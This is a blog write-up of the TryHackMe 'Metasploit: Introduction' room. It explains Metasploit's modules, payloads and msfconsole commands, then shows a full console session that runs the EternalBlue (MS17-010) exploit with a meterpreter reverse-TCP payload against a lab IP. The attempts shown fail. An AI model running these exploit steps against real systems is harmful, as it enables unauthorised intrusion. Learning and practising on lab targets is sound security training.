---
title: tryhackme room "Metasploit Introduction" solving experience 
date: 2025-09-28 00:00:00 +0600
categories: [Hacking, Tryhackme]
tags: [tryhackme, hacking, web exploitation tool]     # TAG names should always be lowercase
description: "tryhackme room \"Metasploit: Introduction\" solving experience"
math: true
---
# Metasploit Intro
This room gives the basic introduction to the popular hacking framework `metasploit`. So let's begin....

## Part 1 : Introduction to Metasploit
Metasplot is the most widely used tool for exploitation. This is quite powerful and considered to be the all in one tool for exploitation steps such as information gatherinng to post exploitation. There are two types of metasploit framework,
1. **Metasploit Pro:** commercially available with good automation and GUI.
2. **Metasploit Community:** The open source version that is mostly used with terminal or commnad line.

The metasploit framework can be divided into three parts,
1. **msfconsole:** The main command-line interface.
2. **Modules:** supporting modules such as exploits, scanners, payloads, etc.
3. **Tools:** Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.

## Part 2 : Main Components of Metasploit
Modules are small components in the metasploit framework that are built to do specific task. We have to learn about the basic topics. They are,
1. **Exploit:** A piece of code that uses a vulnerability present on the target system.
2. **Vulnerability:** A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
3. **Payload:** An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.

### Modules details
The modules in metasploit framework have their specific portions. But In parrot OS which I use we have the metasploit framework is in the usr/share directory. so the shown command would be similar to,
```bash
┌[parrot]─[14:21-28/09]─[/usr/share/metasploit-framework/modules]
└╼sadman$tree -L 2
.
├── auxiliary
│   ├── admin
│   ├── analyze
│   ├── bnat
│   ├── client
│   ├── cloud
│   ├── crawler
│   ├── dos
│   ├── example.py
│   ├── example.rb
│   ├── fileformat
│   ├── fuzzers
│   ├── gather
│   ├── parser
│   ├── pdf
│   ├── scanner
│   ├── server
│   ├── sniffer
│   ├── spoof
│   ├── sqli
│   ├── voip
│   └── vsploit
├── encoders
│   ├── cmd
│   ├── generic
│   ├── mipsbe
│   ├── mipsle
│   ├── php
│   ├── ppc
│   ├── ruby
│   ├── sparc
│   ├── x64
│   └── x86
├── evasion
│   └── windows
├── exploits
│   ├── aix
│   ├── android
│   ├── apple_ios
│   ├── bsd
│   ├── bsdi
│   ├── example_linux_priv_esc.rb
│   ├── example.py
│   ├── example.rb
│   ├── example_webapp.rb
│   ├── firefox
│   ├── freebsd
│   ├── hpux
│   ├── irix
│   ├── linux
│   ├── mainframe
│   ├── multi
│   ├── netware
│   ├── openbsd
│   ├── osx
│   ├── qnx
│   ├── solaris
│   ├── unix
│   └── windows
├── nops
│   ├── aarch64
│   ├── armle
│   ├── cmd
│   ├── mipsbe
│   ├── php
│   ├── ppc
│   ├── riscv32le
│   ├── riscv64le
│   ├── sparc
│   ├── tty
│   ├── x64
│   └── x86
├── payloads
│   ├── adapters
│   ├── singles
│   ├── stagers
│   └── stages
├── post
│   ├── aix
│   ├── android
│   ├── apple_ios
│   ├── bsd
│   ├── firefox
│   ├── hardware
│   ├── linux
│   ├── multi
│   ├── networking
│   ├── osx
│   ├── solaris
│   └── windows
└── README.md

85 directories, 7 files
┌[parrot]─[14:21-28/09]─[/usr/share/metasploit-framework/modules]
└╼sadman$
```
These modules have their own uses. In short,
1. **auxiliary :** Is the tools used for helping other tasks such as scanning, crawling, fuzzing, sniffing, spoofing etc.
2. **encoders :** Encoders will allow us to encode the exploit so that the system cannot understand if it is a payload or other data. 
3. **evasion :** evasion tools are used to upload the payload so that we do not get caught easily.
4. **exploits :** Exploits are vulnarabilities that we can attack. In metasploit framework they are organized by the system.
5. **nops :** NOPs (No OPerations) are used to achieve target payload size if there are a specific size constraint as they do nothing when executed.
6. **payloads :** Paylods are codes that will run on the target system. There are four directories in the payload, 
    1. **Adapters:** An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
    2. **Singles:** Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
    3. **Stagers:** Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
    4. **Stages:** Downloaded by the stager. This will allow you to use larger sized payloads. we can differentiate between singles and stages payload by the naming conventions as singles will have `_` in the name and staged ones will generally will be in a directory tree.
7. **post :** Post modules are used after exploited.

## Part 3 : Msfconsole
`msfconsole` is the console or terminal for the metasploit framework. Aside from having some of the normal terminal operations it has metasploit command as well. for example the `use` command is useful to run a specific exploit. for example, 
```bash
[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> 
```
we have `show options` command to get more options for a particular attack. and there are `show payload` command as well. and if we want to leave the context or exploit we are working with we can just command `back` in the console. and yes msfconsole keeps each command context and uses the previous contexts with the options.

If we want to learn something we can use the `info` command and if we want to search for what an exploit is specifically called we can also `search` it in the msfconsole.  

## Part 4 : Working with modules
When working an attack context we can set attack parameters with the set command. the general template of set command is, 

```bash
set PARAMETER_NAME VALUE
```
where the PARAMETER_NAME is the context such as option, payload, encoding, npos etc. and VALUE is the option which we want to select. we can know which options are available using the 
```bash
show options
```
command as said previously. we can also modify all the commands and set global options if we want to. and then we can execute the designed exploit with the,
```bash
exploit
# or
exploit -z
```
command. where exploit will exploit the session and -z will background the session after exploit. When using the example setup with the example code in the attackbox, 
```bash
[msf](Jobs:0 Agents:0) >> search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

[msf](Jobs:0 Agents:0) >> use 0
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machi
                                             nes.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.48.156.99     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set rhosts 10.201.35.94
rhosts => 10.201.35.94
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> exploit -z
[-] Handler failed to bind to 10.48.156.99:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] 10.201.35.94:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.201.35.94:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.201.35.94:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.201.35.94:445 - The target is vulnerable.
[*] 10.201.35.94:445 - Connecting to target for exploitation.
[+] 10.201.35.94:445 - Connection established for exploitation.
[+] 10.201.35.94:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.35.94:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.35.94:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.201.35.94:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.201.35.94:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.201.35.94:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.35.94:445 - Trying exploit with 12 Groom Allocations.
[*] 10.201.35.94:445 - Sending all but last fragment of exploit packet
[*] 10.201.35.94:445 - Starting non-paged pool grooming
[+] 10.201.35.94:445 - Sending SMBv2 buffers
[+] 10.201.35.94:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.35.94:445 - Sending final SMBv2 buffers.
[*] 10.201.35.94:445 - Sending last fragment of exploit packet!
[*] 10.201.35.94:445 - Receiving response from exploit packet
[+] 10.201.35.94:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.35.94:445 - Sending egg to corrupted connection.
[*] 10.201.35.94:445 - Triggering free of corrupted buffer.
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.201.35.94:445 - Connecting to target for exploitation.
[+] 10.201.35.94:445 - Connection established for exploitation.
[+] 10.201.35.94:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.35.94:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.35.94:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.201.35.94:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.201.35.94:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.201.35.94:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.35.94:445 - Trying exploit with 17 Groom Allocations.
[*] 10.201.35.94:445 - Sending all but last fragment of exploit packet
[*] 10.201.35.94:445 - Starting non-paged pool grooming
[+] 10.201.35.94:445 - Sending SMBv2 buffers
[+] 10.201.35.94:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.35.94:445 - Sending final SMBv2 buffers.
[*] 10.201.35.94:445 - Sending last fragment of exploit packet!
[*] 10.201.35.94:445 - Receiving response from exploit packet
[+] 10.201.35.94:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.35.94:445 - Sending egg to corrupted connection.
[*] 10.201.35.94:445 - Triggering free of corrupted buffer.
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.201.35.94:445 - Connecting to target for exploitation.
[+] 10.201.35.94:445 - Connection established for exploitation.
[+] 10.201.35.94:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.35.94:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.35.94:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.201.35.94:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.201.35.94:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.201.35.94:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.35.94:445 - Trying exploit with 22 Groom Allocations.
[*] 10.201.35.94:445 - Sending all but last fragment of exploit packet
[*] 10.201.35.94:445 - Starting non-paged pool grooming
[+] 10.201.35.94:445 - Sending SMBv2 buffers
[+] 10.201.35.94:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.35.94:445 - Sending final SMBv2 buffers.
[*] 10.201.35.94:445 - Sending last fragment of exploit packet!
[*] 10.201.35.94:445 - Receiving response from exploit packet
[+] 10.201.35.94:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.35.94:445 - Sending egg to corrupted connection.
[*] 10.201.35.94:445 - Triggering free of corrupted buffer.
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> exploit
[-] Handler failed to bind to 10.48.156.99:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] 10.201.35.94:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.201.35.94:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.201.35.94:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.201.35.94:445 - The target is vulnerable.
[*] 10.201.35.94:445 - Connecting to target for exploitation.
[+] 10.201.35.94:445 - Connection established for exploitation.
[+] 10.201.35.94:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.35.94:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.35.94:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.201.35.94:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.201.35.94:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.201.35.94:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.35.94:445 - Trying exploit with 12 Groom Allocations.
[*] 10.201.35.94:445 - Sending all but last fragment of exploit packet
[*] 10.201.35.94:445 - Starting non-paged pool grooming
[+] 10.201.35.94:445 - Sending SMBv2 buffers
[+] 10.201.35.94:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.35.94:445 - Sending final SMBv2 buffers.
[*] 10.201.35.94:445 - Sending last fragment of exploit packet!
[*] 10.201.35.94:445 - Receiving response from exploit packet
[+] 10.201.35.94:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.35.94:445 - Sending egg to corrupted connection.
[*] 10.201.35.94:445 - Triggering free of corrupted buffer.
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.201.35.94:445 - Connecting to target for exploitation.
[+] 10.201.35.94:445 - Connection established for exploitation.
[+] 10.201.35.94:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.35.94:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.35.94:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.201.35.94:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.201.35.94:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.201.35.94:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.35.94:445 - Trying exploit with 17 Groom Allocations.
[*] 10.201.35.94:445 - Sending all but last fragment of exploit packet
[*] 10.201.35.94:445 - Starting non-paged pool grooming
[+] 10.201.35.94:445 - Sending SMBv2 buffers
[+] 10.201.35.94:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.35.94:445 - Sending final SMBv2 buffers.
[*] 10.201.35.94:445 - Sending last fragment of exploit packet!
[*] 10.201.35.94:445 - Receiving response from exploit packet
[+] 10.201.35.94:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.35.94:445 - Sending egg to corrupted connection.
[*] 10.201.35.94:445 - Triggering free of corrupted buffer.
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.201.35.94:445 - Connecting to target for exploitation.
[+] 10.201.35.94:445 - Connection established for exploitation.
[+] 10.201.35.94:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.35.94:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.35.94:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.201.35.94:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.201.35.94:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.201.35.94:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.35.94:445 - Trying exploit with 22 Groom Allocations.
[*] 10.201.35.94:445 - Sending all but last fragment of exploit packet
[*] 10.201.35.94:445 - Starting non-paged pool grooming
[+] 10.201.35.94:445 - Sending SMBv2 buffers
[+] 10.201.35.94:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.35.94:445 - Sending final SMBv2 buffers.
[*] 10.201.35.94:445 - Sending last fragment of exploit packet!
[*] 10.201.35.94:445 - Receiving response from exploit packet
[+] 10.201.35.94:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.35.94:445 - Sending egg to corrupted connection.
[*] 10.201.35.94:445 - Triggering free of corrupted buffer.
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.35.94:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Exploit completed, but no session was created.
```

## Part 5 : Summary
Metasploit frameworks is very large and I may need to practice this for quite a long time to get used to it.